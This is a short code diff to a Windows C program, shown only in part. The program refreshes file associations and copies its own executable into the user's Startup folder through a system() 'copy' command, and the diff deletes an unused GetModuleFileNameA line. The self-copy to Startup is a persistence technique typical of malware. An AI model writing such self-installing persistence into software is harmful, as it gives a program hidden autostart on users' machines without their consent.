@@ -14,9 +14,7 @@ int main(int argc, char* argv[]){
 
     SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_FLUSHNOWAIT, NULL, NULL);
 
-    const char* path[100];
     const char* command[128];
-    GetModuleFileNameA(NULL, path, 128);
     sprintf(command, "copy \"%s\" \"%%USERPROFILE%%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"", argv[0]);
     system(command);
     return 0;
